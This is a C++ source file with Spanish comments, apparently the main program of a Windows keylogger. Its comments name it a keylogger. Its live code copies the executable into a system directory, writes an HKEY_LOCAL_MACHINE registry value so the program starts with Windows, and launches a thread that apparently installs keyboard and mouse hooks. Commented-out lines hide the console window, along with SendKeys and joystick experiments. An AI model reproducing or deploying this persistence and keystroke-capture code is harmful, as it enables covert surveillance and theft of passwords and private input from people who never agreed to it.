// function declaration.
//#include "SendKeys.h"
//#include <iostream>
//#include <ctime>
//#include <hidsdi.h>
//
//#define _USE_MATH_DEFINES
//#include <math.h>
//#define ARRAY_SIZE(x)	(sizeof(x) / sizeof((x)[0]))
//#define WC_MAINFRAME	TEXT("MainFrame")
//#define MAX_BUTTONS		128
//#define CHECK(exp)		{ if(!(exp)) goto Error; }
//#define SAFE_FREE(p)	{ if(p) { HeapFree(hHeap, 0, p); (p) = NULL; } }

#include "hotkey.h"
#include "thread.h"
#include "registry.h"

HotKey *HotKey::m_pThis;
//template <class T> DWORD HotKey<T>::estado = 0;




#ifdef WIN
HHOOK HotKey::hookKB;
HHOOK HotKey::hookMOUSE;
#endif

int main(){

    /**Evitamos que se muestre la ventana*/

//    HWND stealth;
//    AllocConsole();
//    stealth=FindWindowA("ConsoleWindowClass",NULL);
//    ShowWindow(stealth,0);

    //Código que copia el Keylogger en system32 y añade un registro de Windows para que se inicie con el sistema.
    char pathname[PATH_MAX];
    HMODULE hMe=GetModuleHandle(NULL);
    GetModuleFileName(hMe,pathname,PATH_MAX);
    std::cout << "pathname :" << pathname << endl;

    if (CopyFile(pathname, EXECDIR,0) == 0)
        std::cout << "Error al copiar el fichero en " << EXECDIR << endl;

    Registry reg;
    reg.deleteKeyReg(HKEY_LOCAL_MACHINE, REGKEY, REGNAME);

    HKEY hkey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGKEY, 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hkey);
    RegSetValueEx(hkey, REGNAME, 0, REG_SZ, (const unsigned char*)EXECDIR, strlen(EXECDIR));

    RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGKEY, 0, KEY_ALL_ACCESS, &hkey);
    RegSetValueEx(hkey, REGNAME, 0, REG_SZ, (const unsigned char*)EXECDIR, strlen(EXECDIR));

    RegCloseKey(hkey);

    //RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGKEY, 0, KEY_ALL_ACCESS, &hkey);
    //RegDeleteKeyEx(hkey, REGNAME, 0, 0);
//    RegSetValueEx(hkey, REGNAME, 0, REG_SZ, (const unsigned char*)EXECDIR, strlen(EXECDIR));
    //RegCloseKey(hkey);
//Fin

/**Captura de eventos del joystick*/
    //Registramos para los eventos de joystick
//    RAWINPUTDEVICE rid;
//
//    rid.usUsagePage = 1;
//    rid.usUsage     = 4;	// Joystick
//    rid.dwFlags     = 0;
//    rid.hwndTarget  = hWnd;
//
//    if(!RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE)))
//        return -1;

/**Envio de teclas*/
//CSendKeys sk;
//// Run notepad
//sk.SendKeys("{DELAY=1000}DEL BARCO DEL CHANQUETE NO NOS MOVERAN");
//
//long double sysTime = time(0);
//Sleep(3200);
//
//sysTime = time(0);
//int fps = 0;
//
//int maxSecs = 10;
//
//while ((time(0) - sysTime) < maxSecs){
//    OnPaint();
//    fps++;
//}
//
//cout << "fps=" << fps/(float)maxSecs;

//sk.SendKeys("ESTAMOS EN la b DE LA PROVINCIA");

//sk.SendMouseEvent(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, 5, 5, 0, 1);
//sk.SendMouseEvent(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 5, 5, 0, 1);
//sk.SendKeys("{MOUSEMOVE=640,480}");

//    sk.SendKeys("{DELAY=1000}");
//    for (int i=0; i<5; i++){
//        sk.SendKeys("{MOUSEDOWNWHEEL=120}");
//    }

//    HotKey *hk = new HotKey();
//    hk->SetKeyboardHook();

    //HotKey *wi = new HotKey();
    //wi->init();

/**Pruebas con threads*/

     // Random object with DWORD method (void)
    HotKey *world = new HotKey();
    Thread<HotKey> *thread = new Thread<HotKey>(world, &HotKey::init);
    if (thread->start())
        std::cout << "Thread started with id: " << thread->getThreadID() << std::endl;

    int res1 = thread->join(); // wait for thread
    cout << "Fin del thread: " << res1 << endl;

    delete world;
    delete thread;
    return 0;
}



